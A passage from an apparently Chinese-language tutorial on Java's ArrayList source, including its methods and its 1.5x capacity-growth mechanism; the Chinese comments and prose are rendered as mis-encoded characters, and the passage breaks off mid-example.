è¿”å›æ­¤åˆ—è¡¨ä¸­æŒ‡å®šå…ƒç´ çš„æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œå¦‚æœæ­¤åˆ—è¡¨ä¸åŒ…å«å…ƒç´ ï¼Œåˆ™è¿”å›-1ã€‚.\n     */\n    public int lastIndexOf(Object o) {\n        if (o == null) {\n            for (int i = size-1; i >= 0; i--)\n                if (elementData[i]==null)\n                    return i;\n        } else {\n            for (int i = size-1; i >= 0; i--)\n                if (o.equals(elementData[i]))\n                    return i;\n        }\n        return -1;\n    }\n\n    /**\n     * è¿”å›æ­¤ArrayListå®ä¾‹çš„æµ…æ‹·è´ã€‚ ï¼ˆå…ƒç´ æœ¬èº«ä¸è¢«å¤åˆ¶ã€‚ï¼‰\n     */\n    public Object clone() {\n        try {\n            ArrayList<?> v = (ArrayList<?>) super.clone();\n            //Arrays.copyOfåŠŸèƒ½æ˜¯å®ç°æ•°ç»„çš„å¤åˆ¶ï¼Œè¿”å›å¤åˆ¶åçš„æ•°ç»„ã€‚å‚æ•°æ˜¯è¢«å¤åˆ¶çš„æ•°ç»„å’Œå¤åˆ¶çš„é•¿åº¦\n            v.elementData = Arrays.copyOf(elementData, size);\n            v.modCount = 0;\n            return v;\n        } catch (CloneNotSupportedException e) {\n            // è¿™ä¸åº”è¯¥å‘ç”Ÿï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯å¯ä»¥å…‹éš†çš„\n            throw new InternalError(e);\n        }\n    }\n\n    /**\n     *ä»¥æ­£ç¡®çš„é¡ºåºï¼ˆä»ç¬¬ä¸€ä¸ªåˆ°æœ€åä¸€ä¸ªå…ƒç´ ï¼‰è¿”å›ä¸€ä¸ªåŒ…å«æ­¤åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ã€‚\n     *è¿”å›çš„æ•°ç»„å°†æ˜¯â€œå®‰å…¨çš„â€ï¼Œå› ä¸ºè¯¥åˆ—è¡¨ä¸ä¿ç•™å¯¹å®ƒçš„å¼•ç”¨ã€‚ ï¼ˆæ¢å¥è¯è¯´ï¼Œè¿™ä¸ªæ–¹æ³•å¿…é¡»åˆ†é…ä¸€ä¸ªæ–°çš„æ•°ç»„ï¼‰ã€‚\n     *å› æ­¤ï¼Œè°ƒç”¨è€…å¯ä»¥è‡ªç”±åœ°ä¿®æ”¹è¿”å›çš„æ•°ç»„ã€‚ æ­¤æ–¹æ³•å……å½“åŸºäºé˜µåˆ—å’ŒåŸºäºé›†åˆçš„APIä¹‹é—´çš„æ¡¥æ¢ã€‚\n     */\n    public Object[] toArray() {\n        return Arrays.copyOf(elementData, size);\n    }\n\n    /**\n     * ä»¥æ­£ç¡®çš„é¡ºåºè¿”å›ä¸€ä¸ªåŒ…å«æ­¤åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ï¼ˆä»ç¬¬ä¸€ä¸ªåˆ°æœ€åä¸€ä¸ªå…ƒç´ ï¼‰;\n     *è¿”å›çš„æ•°ç»„çš„è¿è¡Œæ—¶ç±»å‹æ˜¯æŒ‡å®šæ•°ç»„çš„è¿è¡Œæ—¶ç±»å‹ã€‚ å¦‚æœåˆ—è¡¨é€‚åˆæŒ‡å®šçš„æ•°ç»„ï¼Œåˆ™è¿”å›å…¶ä¸­ã€‚\n     *å¦åˆ™ï¼Œå°†ä¸ºæŒ‡å®šæ•°ç»„çš„è¿è¡Œæ—¶ç±»å‹å’Œæ­¤åˆ—è¡¨çš„å¤§å°åˆ†é…ä¸€ä¸ªæ–°æ•°ç»„ã€‚\n     *å¦‚æœåˆ—è¡¨é€‚ç”¨äºæŒ‡å®šçš„æ•°ç»„ï¼Œå…¶ä½™ç©ºé—´ï¼ˆå³æ•°ç»„çš„åˆ—è¡¨æ•°é‡å¤šäºæ­¤å…ƒç´ ï¼‰ï¼Œåˆ™ç´§è·Ÿåœ¨é›†åˆç»“æŸåçš„æ•°ç»„ä¸­çš„å…ƒç´ è®¾ç½®ä¸ºnull ã€‚\n     *ï¼ˆè¿™ä»…åœ¨è°ƒç”¨è€…çŸ¥é“åˆ—è¡¨ä¸åŒ…å«ä»»ä½•ç©ºå…ƒç´ çš„æƒ…å†µä¸‹æ‰èƒ½ç¡®å®šåˆ—è¡¨çš„é•¿åº¦ã€‚ï¼‰\n     */\n    @SuppressWarnings(\"unchecked\")\n    public <T> T[] toArray(T[] a) {\n        if (a.length < size)\n            // æ–°å»ºä¸€ä¸ªè¿è¡Œæ—¶ç±»å‹çš„æ•°ç»„ï¼Œä½†æ˜¯ArrayListæ•°ç»„çš„å†…å®¹\n            return (T[]) Arrays.copyOf(elementData, size, a.getClass());\n            //è°ƒç”¨Systemæä¾›çš„arraycopy()æ–¹æ³•å®ç°æ•°ç»„ä¹‹é—´çš„å¤åˆ¶\n        System.arraycopy(elementData, 0, a, 0, size);\n        if (a.length > size)\n            a[size] = null;\n        return a;\n    }\n\n    // Positional Access Operations\n\n    @SuppressWarnings(\"unchecked\")\n    E elementData(int index) {\n        return (E) elementData[index];\n    }\n\n    /**\n     * è¿”å›æ­¤åˆ—è¡¨ä¸­æŒ‡å®šä½ç½®çš„å…ƒç´ ã€‚\n     */\n    public E get(int index) {\n        rangeCheck(index);\n\n        return elementData(index);\n    }\n\n    /**\n     * ç”¨æŒ‡å®šçš„å…ƒç´ æ›¿æ¢æ­¤åˆ—è¡¨ä¸­æŒ‡å®šä½ç½®çš„å…ƒç´ ã€‚\n     */\n    public E set(int index, E element) {\n        //å¯¹indexè¿›è¡Œç•Œé™æ£€æŸ¥\n        rangeCheck(index);\n\n        E oldValue = elementData(index);\n        elementData[index] = element;\n        //è¿”å›åŸæ¥åœ¨è¿™ä¸ªä½ç½®çš„å…ƒç´ \n        return oldValue;\n    }\n\n    /**\n     * å°†æŒ‡å®šçš„å…ƒç´ è¿½åŠ åˆ°æ­¤åˆ—è¡¨çš„æœ«å°¾ã€‚\n     */\n    public boolean add(E e) {\n        ensureCapacityInternal(size + 1);  // Increments modCount!!\n        //è¿™é‡Œçœ‹åˆ°ArrayListæ·»åŠ å…ƒç´ çš„å®è´¨å°±ç›¸å½“äºä¸ºæ•°ç»„èµ‹å€¼\n        elementData[size++] = e;\n        return true;\n    }\n\n    /**\n     * åœ¨æ­¤åˆ—è¡¨ä¸­çš„æŒ‡å®šä½ç½®æ’å…¥æŒ‡å®šçš„å…ƒç´ ã€‚\n     *å…ˆè°ƒç”¨ rangeCheckForAdd å¯¹indexè¿›è¡Œç•Œé™æ£€æŸ¥ï¼›ç„¶åè°ƒç”¨ ensureCapacityInternal æ–¹æ³•ä¿è¯capacityè¶³å¤Ÿå¤§ï¼›\n     *å†å°†ä»indexå¼€å§‹ä¹‹åçš„æ‰€æœ‰æˆå‘˜åç§»ä¸€ä¸ªä½ç½®ï¼›å°†elementæ’å…¥indexä½ç½®ï¼›æœ€åsizeåŠ 1ã€‚\n     */\n    public void add(int index, E element) {\n        rangeCheckForAdd(index);\n\n        ensureCapacityInternal(size + 1);  // Increments modCount!!\n        //arraycopy()è¿™ä¸ªå®ç°æ•°ç»„ä¹‹é—´å¤åˆ¶çš„æ–¹æ³•ä¸€å®šè¦çœ‹ä¸€ä¸‹ï¼Œä¸‹é¢å°±ç”¨åˆ°äº†arraycopy()æ–¹æ³•å®ç°æ•°ç»„è‡ªå·±å¤åˆ¶è‡ªå·±\n        System.arraycopy(elementData, index, elementData, index + 1,\n                         size - index);\n        elementData[index] = element;\n        size++;\n    }\n\n    /**\n     * åˆ é™¤è¯¥åˆ—è¡¨ä¸­æŒ‡å®šä½ç½®çš„å…ƒç´ ã€‚ å°†ä»»ä½•åç»­å…ƒç´ ç§»åŠ¨åˆ°å·¦ä¾§ï¼ˆä»å…¶ç´¢å¼•ä¸­å‡å»ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚\n     */\n    public E remove(int index) {\n        rangeCheck(index);\n\n        modCount++;\n        E oldValue = elementData(index);\n\n        int numMoved = size - index - 1;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index+1, elementData, index,\n                             numMoved);\n        elementData[--size] = null; // clear to let GC do its work\n      //ä»åˆ—è¡¨ä¸­åˆ é™¤çš„å…ƒç´ \n        return oldValue;\n    }\n\n    /**\n     * ä»åˆ—è¡¨ä¸­åˆ é™¤æŒ‡å®šå…ƒç´ çš„ç¬¬ä¸€ä¸ªå‡ºç°ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ å¦‚æœåˆ—è¡¨ä¸åŒ…å«è¯¥å…ƒç´ ï¼Œåˆ™å®ƒä¸ä¼šæ›´æ”¹ã€‚\n     *è¿”å›trueï¼Œå¦‚æœæ­¤åˆ—è¡¨åŒ…å«æŒ‡å®šçš„å…ƒç´ \n     */\n    public boolean remove(Object o) {\n        if (o == null) {\n            for (int index = 0; index < size; index++)\n                if (elementData[index] == null) {\n                    fastRemove(index);\n                    return true;\n                }\n        } else {\n            for (int index = 0; index < size; index++)\n                if (o.equals(elementData[index])) {\n                    fastRemove(index);\n                    return true;\n                }\n        }\n        return false;\n    }\n\n    /*\n     * Private remove method that skips bounds checking and does not\n     * return the value removed.\n     */\n    private void fastRemove(int index) {\n        modCount++;\n        int numMoved = size - index - 1;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index+1, elementData, index,\n                             numMoved);\n        elementData[--size] = null; // clear to let GC do its work\n    }\n\n    /**\n     * ä»åˆ—è¡¨ä¸­åˆ é™¤æ‰€æœ‰å…ƒç´ ã€‚\n     */\n    public void clear() {\n        modCount++;\n\n        // æŠŠæ•°ç»„ä¸­æ‰€æœ‰çš„å…ƒç´ çš„å€¼è®¾ä¸ºnull\n        for (int i = 0; i < size; i++)\n            elementData[i] = null;\n\n        size = 0;\n    }\n\n    /**\n     * æŒ‰æŒ‡å®šé›†åˆçš„Iteratorè¿”å›çš„é¡ºåºå°†æŒ‡å®šé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ è¿½åŠ åˆ°æ­¤åˆ—è¡¨çš„æœ«å°¾ã€‚\n     */\n    public boolean addAll(Collection<? extends E> c) {\n        Object[] a = c.toArray();\n        int numNew = a.length;\n        ensureCapacityInternal(size + numNew);  // Increments modCount\n        System.arraycopy(a, 0, elementData, size, numNew);\n        size += numNew;\n        return numNew != 0;\n    }\n\n    /**\n     * å°†æŒ‡å®šé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ æ’å…¥åˆ°æ­¤åˆ—è¡¨ä¸­ï¼Œä»æŒ‡å®šçš„ä½ç½®å¼€å§‹ã€‚\n     */\n    public boolean addAll(int index, Collection<? extends E> c) {\n        rangeCheckForAdd(index);\n\n        Object[] a = c.toArray();\n        int numNew = a.length;\n        ensureCapacityInternal(size + numNew);  // Increments modCount\n\n        int numMoved = size - index;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index, elementData, index + numNew,\n                             numMoved);\n\n        System.arraycopy(a, 0, elementData, index, numNew);\n        size += numNew;\n        return numNew != 0;\n    }\n\n    /**\n     * ä»æ­¤åˆ—è¡¨ä¸­åˆ é™¤æ‰€æœ‰ç´¢å¼•ä¸ºfromIndex ï¼ˆå«ï¼‰å’ŒtoIndexä¹‹é—´çš„å…ƒç´ ã€‚\n     *å°†ä»»ä½•åç»­å…ƒç´ ç§»åŠ¨åˆ°å·¦ä¾§ï¼ˆå‡å°‘å…¶ç´¢å¼•ï¼‰ã€‚\n     */\n    protected void removeRange(int fromIndex, int toIndex) {\n        modCount++;\n        int numMoved = size - toIndex;\n        System.arraycopy(elementData, toIndex, elementData, fromIndex,\n                         numMoved);\n\n        // clear to let GC do its work\n        int newSize = size - (toIndex-fromIndex);\n        for (int i = newSize; i < size; i++) {\n            elementData[i] = null;\n        }\n        size = newSize;\n    }\n\n    /**\n     * æ£€æŸ¥ç»™å®šçš„ç´¢å¼•æ˜¯å¦åœ¨èŒƒå›´å†…ã€‚\n     */\n    private void rangeCheck(int index) {\n        if (index >= size)\n            throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n    }\n\n    /**\n     * addå’ŒaddAllä½¿ç”¨çš„rangeCheckçš„ä¸€ä¸ªç‰ˆæœ¬\n     */\n    private void rangeCheckForAdd(int index) {\n        if (index > size || index < 0)\n            throw new IndexOutOfBoundsException(outOfBoundsMsg(index));\n    }\n\n    /**\n     * è¿”å›IndexOutOfBoundsExceptionç»†èŠ‚ä¿¡æ¯\n     */\n    private String outOfBoundsMsg(int index) {\n        return \"Index: \"+index+\", Size: \"+size;\n    }\n\n    /**\n     * ä»æ­¤åˆ—è¡¨ä¸­åˆ é™¤æŒ‡å®šé›†åˆä¸­åŒ…å«çš„æ‰€æœ‰å…ƒç´ ã€‚\n     */\n    public boolean removeAll(Collection<?> c) {\n        Objects.requireNonNull(c);\n        //å¦‚æœæ­¤åˆ—è¡¨è¢«ä¿®æ”¹åˆ™è¿”å›true\n        return batchRemove(c, false);\n    }\n\n    /**\n     * ä»…ä¿ç•™æ­¤åˆ—è¡¨ä¸­åŒ…å«åœ¨æŒ‡å®šé›†åˆä¸­çš„å…ƒç´ ã€‚\n     *æ¢å¥è¯è¯´ï¼Œä»æ­¤åˆ—è¡¨ä¸­åˆ é™¤å…¶ä¸­ä¸åŒ…å«åœ¨æŒ‡å®šé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚\n     */\n    public boolean retainAll(Collection<?> c) {\n        Objects.requireNonNull(c);\n        return batchRemove(c, true);\n    }\n\n\n    /**\n     * ä»åˆ—è¡¨ä¸­çš„æŒ‡å®šä½ç½®å¼€å§‹ï¼Œè¿”å›åˆ—è¡¨ä¸­çš„å…ƒç´ ï¼ˆæŒ‰æ­£ç¡®é¡ºåºï¼‰çš„åˆ—è¡¨è¿­ä»£å™¨ã€‚\n     *æŒ‡å®šçš„ç´¢å¼•è¡¨ç¤ºåˆå§‹è°ƒç”¨å°†è¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºnext ã€‚ åˆå§‹è°ƒç”¨previouså°†è¿”å›æŒ‡å®šç´¢å¼•å‡1çš„å…ƒç´ ã€‚\n     *è¿”å›çš„åˆ—è¡¨è¿­ä»£å™¨æ˜¯fail-fast ã€‚\n     */\n    public ListIterator<E> listIterator(int index) {\n        if (index < 0 || index > size)\n            throw new IndexOutOfBoundsException(\"Index: \"+index);\n        return new ListItr(index);\n    }\n\n    /**\n     *è¿”å›åˆ—è¡¨ä¸­çš„åˆ—è¡¨è¿­ä»£å™¨ï¼ˆæŒ‰é€‚å½“çš„é¡ºåºï¼‰ã€‚\n     *è¿”å›çš„åˆ—è¡¨è¿­ä»£å™¨æ˜¯fail-fast ã€‚\n     */\n    public ListIterator<E> listIterator() {\n        return new ListItr(0);\n    }\n\n    /**\n     *ä»¥æ­£ç¡®çš„é¡ºåºè¿”å›è¯¥åˆ—è¡¨ä¸­çš„å…ƒç´ çš„è¿­ä»£å™¨ã€‚\n     *è¿”å›çš„è¿­ä»£å™¨æ˜¯fail-fast ã€‚\n     */\n    public Iterator<E> iterator() {\n        return new Itr();\n    }\n```\n\n### æ‰©å®¹æœºåˆ¶\n\n> ä¸ºäº†æ–¹ä¾¿å¤ä¹ å…ˆç»™å‡ºæ‰©å®¹æºç åˆ†æçš„ç»“è®ºï¼Œç„¶åå†è¿›è¡Œè¯¦ç»†åˆ†æï¼Œåˆ†ææµç¨‹æ˜¯å…ˆæŠŠåˆ›å»ºå’Œæ‰©å®¹ç”¨åˆ°çš„å±æ€§å’Œæ–¹æ³•å•ç‹¬è®²è§£ï¼Œç„¶åæ¨¡æ‹Ÿä¸€ä¸ªåœºæ™¯æ¥ä¸€æ­¥ä¸€æ­¥æ¥ debug\n\n#### ç»“è®º\n\n- 1.ArrayList ä¸­ç»´æŠ¤äº†ä¸€ä¸ª Object ç±»å‹çš„æ•°ç»„ elementData\n  - transient Object[] elementData; //transientè¡¨ç¤ºç¬é—´,çŸ­æš‚çš„ï¼Œè¡¨ç¤ºè¯¥å±æ€§ä¸ä¼šè¢«åº\n    åˆ—åŒ–\n\n- 2.åˆ›å»º ArrayList å¯¹è±¡æ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æ— å‚æ„é€ å™¨ï¼Œåˆ™åˆå§‹ elementData å®¹é‡ä¸º 0\n  - ç¬¬ 1 æ¬¡æ·»åŠ ï¼Œåˆ™æ‰©å®¹ elementData ä¸º 10\n  - å¦‚éœ€å†æ¬¡æ‰©å®¹ï¼Œåˆ™æ‰©å®¹ elementData ä¸º 1.5 å€\n- 3.åˆ›å»º ArrayList å¯¹è±¡æ—¶ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æŒ‡å®šå¤§å°çš„æ„é€ å™¨ï¼Œåˆ™åˆå§‹ elementData å®¹é‡ä¸ºæŒ‡å®šå¤§å°\n  - å¦‚æœéœ€è¦æ‰©å®¹ï¼Œåˆ™ç›´æ¥æ‰©å®¹ elementData ä¸º 1.5 å€\n\n#### å±æ€§&æ–¹æ³•\n\nå¦‚ä¸‹æ˜¯ ArrayList åˆ›å»ºå’Œæ‰©å®¹ç”¨åˆ°çš„ä¸»è¦å±æ€§å’Œæ–¹æ³•ï¼Œè¿™é‡Œå…ˆåˆ—å‡ºæ¥ï¼Œåé¢å†è¯¦ç»†è®²è§£\n\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable {\n    // é»˜è®¤åˆå§‹çš„å®¹é‡\n    private static final int DEFAULT_CAPACITY = 10;\n    // ä¸€ä¸ªç©ºæ•°ç»„\n    private static final Object[] EMPTY_ELEMENTDATA = {};\n    // ä¸€ä¸ªç©ºæ•°ç»„ï¼Œå¦‚æœä½¿ç”¨æ— å‚æ„é€ å‡½æ•°åˆ›å»ºï¼Œåˆ™ä½¿ç”¨è¯¥å€¼\n    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n    // å½“å‰æ•°æ®å¯¹è±¡å­˜æ”¾åœ°æ–¹ï¼Œå½“å‰å¯¹è±¡ä¸å‚ä¸åºåˆ—åŒ–\n    transient Object[] elementData;\n    // å½“å‰æ•°ç»„æ‰€åŒ…å«çš„å…ƒç´ ä¸ªæ•°\n    private int size;\n    // æ•°ç»„æœ€å¤§é•¿åº¦\n    private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n  \n    //protected transient int modCount = 0;\n    // modCountå±æ€§ä»AbstractListç»§æ‰¿è¿‡æ¥çš„ï¼Œä»£è¡¨ArrayListé›†åˆçš„ä¿®æ”¹æ¬¡æ•°ã€‚\n  \n  \t//å¦‚ä¸‹æ˜¯ArrayListåˆ›å»ºå’Œæ‰©å®¹ä¸»è¦æ–¹æ³•ï¼Œçœç•¥äº†æ–¹æ³•ä½“\n  \n    public ArrayList(int initialCapacity) {}\n   \n    public ArrayList() {}\n\n    public ArrayList(Collection<? extends E> c) {}\n  \n    public boolean add(E e) {}\n\n    public void ensureCapacity(int minCapacity) {}\n\n    private static int calculateCapacity(Object[] elementData, int minCapacity) {}\n\n    private void ensureCapacityInternal(int minCapacity) {}\n\n    private void ensureExplicitCapacity(int minCapacity) {}\n\n    private void grow(int minCapacity) {}\n\n    private static int hugeCapacity(int minCapacity) {}\n}\n```\n\n#### æ„é€ å‡½æ•°\n\n##### æ— å‚æ„é€ å‡½æ•°\n\n```java\npublic ArrayList() {\n  this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;\n}\n```\n\n##### å¸¦intç±»å‹æ„é€ å‡½æ•°\n\n```java\npublic ArrayList(int initialCapacity) {\n  if (initialCapacity > 0) {//åˆå§‹å®¹é‡å¤§äº0\n    //åˆ›å»ºinitialCapacityå¤§å°çš„æ•°ç»„\n    this.elementData = new Object[initialCapacity];\n  } else if (initialCapacity == 0) {//åˆå§‹å®¹é‡ç­‰äº0\n    //åˆ›å»ºç©ºæ•°ç»„\n    this.elementData = EMPTY_ELEMENTDATA;\n  } else {//åˆå§‹å®¹é‡å°äº0ï¼ŒæŠ›å‡ºå¼‚å¸¸\n    throw new IllegalArgumentException(\"Illegal Capacity: \"+\n                                       initialCapacity);\n  }\n}\n```\n\n##### å¸¦Collectionå¯¹è±¡æ„é€ å‡½æ•°\n\n```java\npublic ArrayList(Collection<? extends E> c) {\n  Object[] a = c.toArray();\n  if ((size = a.length) != 0) {\n    if (c.getClass() == ArrayList.class) {\n      elementData = a;\n    } else {\n      elementData = Arrays.copyOf(a, size, Object[].class);\n    }\n  } else {\n    // replace with empty array.\n    elementData = EMPTY_ELEMENTDATA;\n  }\n}\n```\n\n#### æ‰©å®¹æ–¹æ³•\n\n##### add\n\n```java\n//å°†æŒ‡å®šçš„å…ƒç´ è¿½åŠ åˆ°æ­¤åˆ—è¡¨çš„æœ«å°¾\npublic boolean add(E e) {\n  //æ·»åŠ å…ƒç´ ä¹‹å‰ï¼Œå…ˆè°ƒç”¨ensureCapacityInternalæ–¹æ³•\n  ensureCapacityInternal(size + 1);  // Increments modCount!!\n  //è¿™é‡Œçœ‹åˆ°ArrayListæ·»åŠ å…ƒç´ çš„å®è´¨å°±ç›¸å½“äºä¸ºæ•°ç»„èµ‹å€¼\n  elementData[size++] = e;\n  return true;\n}\n```\n\n##### ensureCapacityInternal\n\n```java\n//å¾—åˆ°æœ€å°æ‰©å®¹é‡\nprivate void ensureCapacityInternal(int minCapacity) {\n  if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) {\n    // è·å–é»˜è®¤çš„å®¹é‡å’Œä¼ å…¥å‚æ•°çš„è¾ƒå¤§å€¼\n    minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity);\n  }\n  ensureExplicitCapacity(minCapacity);\n}\n```\n\nå½“ è¦ add è¿›ç¬¬ 1 ä¸ªå…ƒç´ æ—¶ï¼ŒminCapacity ä¸º 1ï¼Œåœ¨ Math.max()æ–¹æ³•æ¯”è¾ƒåï¼ŒminCapacity ä¸º 10ã€‚\n\n##### ensureExplicitCapacity\n\nå¦‚æœè°ƒç”¨ `ensureCapacityInternal()` æ–¹æ³•å°±ä¸€å®šä¼šè¿›å…¥ï¼ˆæ‰§è¡Œï¼‰è¿™ä¸ªæ–¹æ³•\n\n```java\n//åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹\nprivate void ensureExplicitCapacity(int minCapacity) {\n  modCount++;\n  // overflow-conscious code\n  if (minCapacity - elementData.length > 0)\n    //è°ƒç”¨growæ–¹æ³•è¿›è¡Œæ‰©å®¹ï¼Œè°ƒç”¨æ­¤æ–¹æ³•ä»£è¡¨å·²ç»å¼€å§‹æ‰©å®¹äº†\n    grow(minCapacity);\n}\n```\n\n- å½“æˆ‘ä»¬è¦ add è¿›ç¬¬ 1 ä¸ªå…ƒç´ åˆ° ArrayList æ—¶ï¼ŒelementData.length ä¸º 0 ï¼ˆå› ä¸ºè¿˜æ˜¯ä¸€ä¸ªç©ºçš„ listï¼‰ï¼Œå› ä¸ºæ‰§è¡Œäº† `ensureCapacityInternal()` æ–¹æ³• ï¼Œæ‰€ä»¥ minCapacity æ­¤æ—¶ä¸º 10ã€‚æ­¤æ—¶ï¼Œ`minCapacity - elementData.length > 0`æˆç«‹ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ `grow(minCapacity)` æ–¹æ³•ã€‚\n- å½“ add ç¬¬ 2 ä¸ªå…ƒç´ æ—¶ï¼ŒminCapacity ä¸º 2ï¼Œæ­¤æ—¶ e lementData.length(å®¹é‡)åœ¨æ·»åŠ ç¬¬ä¸€ä¸ªå…ƒç´ åæ‰©å®¹æˆ 10 äº†ã€‚æ­¤æ—¶ï¼Œ`minCapacity - elementData.length > 0` ä¸æˆç«‹ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ ï¼ˆæ‰§è¡Œï¼‰`grow(minCapacity)` æ–¹æ³•ã€‚\n- æ·»åŠ ç¬¬ 3ã€4Â·Â·Â·åˆ°ç¬¬ 10 ä¸ªå…ƒç´ æ—¶ï¼Œä¾ç„¶ä¸ä¼šæ‰§è¡Œ grow æ–¹æ³•ï¼Œæ•°ç»„å®¹é‡éƒ½ä¸º 10ã€‚\n\n##### grow\n\n```java\n//è¦åˆ†é…çš„æœ€å¤§æ•°ç»„å¤§å°\nprivate static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n\n//ArrayListæ‰©å®¹çš„æ ¸å¿ƒæ–¹æ³•ã€‚\nprivate void grow(int minCapacity) {\n  // oldCapacityä¸ºæ—§å®¹é‡ï¼ŒnewCapacityä¸ºæ–°å®¹é‡\n  int oldCapacity = elementData.length;\n  //å°†oldCapacity å³ç§»ä¸€ä½ï¼Œå…¶æ•ˆæœç›¸å½“äºoldCapacity /2ï¼Œ\n  //æˆ‘ä»¬çŸ¥é“ä½è¿ç®—çš„é€Ÿåº¦è¿œè¿œå¿«äºæ•´é™¤è¿ç®—ï¼Œæ•´å¥è¿ç®—å¼çš„ç»“æœå°±æ˜¯å°†æ–°å®¹é‡æ›´æ–°ä¸ºæ—§å®¹é‡çš„1.5å€ï¼Œ\n  int newCapacity = oldCapacity + (oldCapacity >> 1);\n  //ç„¶åæ£€æŸ¥æ–°å®¹é‡æ˜¯å¦å¤§äºæœ€å°éœ€è¦å®¹é‡ï¼Œè‹¥è¿˜æ˜¯å°äºæœ€å°éœ€è¦å®¹é‡ï¼Œé‚£ä¹ˆå°±æŠŠæœ€å°éœ€è¦å®¹é‡å½“ä½œæ•°ç»„çš„æ–°å®¹é‡ï¼Œ\n  if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n  // å¦‚æœæ–°å®¹é‡å¤§äº MAX_ARRAY_SIZE,è¿›å…¥(æ‰§è¡Œ) `hugeCapacity()` æ–¹æ³•æ¥æ¯”è¾ƒ minCapacity å’Œ MAX_ARRAY_SIZEï¼Œ\n  //å¦‚æœminCapacityå¤§äºæœ€å¤§å®¹é‡ï¼Œåˆ™æ–°å®¹é‡åˆ™ä¸º`Integer.MAX_VALUE`ï¼Œå¦åˆ™ï¼Œæ–°å®¹é‡å¤§å°åˆ™ä¸º MAX_ARRAY_SIZE å³ä¸º `Integer.MAX_VALUE - 8`ã€‚\n  if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n  // minCapacity is usually close to size, so this is a win:\n  elementData = Arrays.copyOf(elementData, newCapacity);//æ‰©å®¹\n}\n```\n\nArrayList æ¯æ¬¡æ‰©å®¹ä¹‹åå®¹é‡éƒ½ä¼šå˜ä¸ºåŸæ¥çš„ 1.5 å€å·¦å³ï¼ˆoldCapacity ä¸ºå¶æ•°å°±æ˜¯ 1.5 å€ï¼Œå¦åˆ™æ˜¯ 1.5 å€å·¦å³ï¼‰ï¼ å¥‡å¶ä¸åŒï¼Œæ¯”å¦‚ ï¼š10+10/2 = 15, 33+33/2=49ã€‚å¦‚æœæ˜¯å¥‡æ•°çš„è¯ä¼šä¸¢æ‰å°æ•°.\n\n \">>\"ï¼ˆç§»ä½è¿ç®—ç¬¦ï¼‰ï¼š>>1 å³ç§»ä¸€ä½ç›¸å½“äºé™¤ 2ï¼Œå³ç§» n ä½ç›¸å½“äºé™¤ä»¥ 2 çš„ n æ¬¡æ–¹ã€‚è¿™é‡Œ oldCapacity æ˜æ˜¾å³ç§»äº† 1 ä½æ‰€ä»¥ç›¸å½“äº oldCapacity /2ã€‚å¯¹äºå¤§æ•°æ®çš„ 2 è¿›åˆ¶è¿ç®—,ä½ç§»è¿ç®—ç¬¦æ¯”é‚£äº›æ™®é€šè¿ç®—ç¬¦çš„è¿ç®—è¦å¿«å¾ˆå¤š,å› ä¸ºç¨‹åºä»…ä»…ç§»åŠ¨ä¸€ä¸‹è€Œå·²ï¼Œä¸å»è®¡ç®—ï¼Œè¿™æ ·æé«˜äº†æ•ˆç‡ï¼ŒèŠ‚çœäº†èµ„æº\n\n##### hugeCapacity\n\nå¦‚æœæ–°å®¹é‡å¤§äº MAX_ARRAY_SIZEï¼Œè¿›å…¥(æ‰§è¡Œ) `hugeCapacity()` æ–¹æ³•æ¥æ¯”è¾ƒ minCapacity å’Œ MAX_ARRAY_SIZE\n\n```java\nprivate static int hugeCapacity(int minCapacity) {\n  if (minCapacity < 0) // overflow\n    throw new OutOfMemoryError();\n  //å¯¹minCapacityå’ŒMAX_ARRAY_SIZEè¿›è¡Œæ¯”è¾ƒ\n  //è‹¥minCapacityå¤§ï¼Œå°†Integer.MAX_VALUEä½œä¸ºæ–°æ•°ç»„çš„å¤§å°\n  //è‹¥MAX_ARRAY_SIZEå¤§ï¼Œå°†MAX_ARRAY_SIZEä½œä¸ºæ–°æ•°ç»„çš„å¤§å°\n  //MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;\n  return (minCapacity > MAX_ARRAY_SIZE) ?Integer.MAX_VALUE :\n  MAX_ARRAY_SIZE;\n}\n```\n\nå¦‚æœ minCapacity å¤§äºæœ€å¤§å®¹é‡ï¼Œåˆ™æ–°å®¹é‡åˆ™ä¸º`Integer.MAX_VALUE`ï¼Œå¦åˆ™ï¼Œæ–°å®¹é‡å¤§å°åˆ™ä¸º MAX_ARRAY_SIZE å³ä¸º `Integer.MAX_VALUE - 8`\n\n![æ‰©å®¹æµç¨‹](https://img.jwt1399.top/img/202208232323066.jpg)\n\n#### æ‰©å®¹åœºæ™¯æ¨¡æ‹Ÿ\n\n##### æ¡ˆä¾‹1ï¼šæ— å‚æ„é€ å‡½æ•°\n\n```java\n//æ¨¡æ‹Ÿä»£ç \nimport java.util.ArrayList;\npublic class ArrayListSource {\n    public static void main(String[] args) {\n        //ä½¿ç”¨æ— å‚æ„é€ 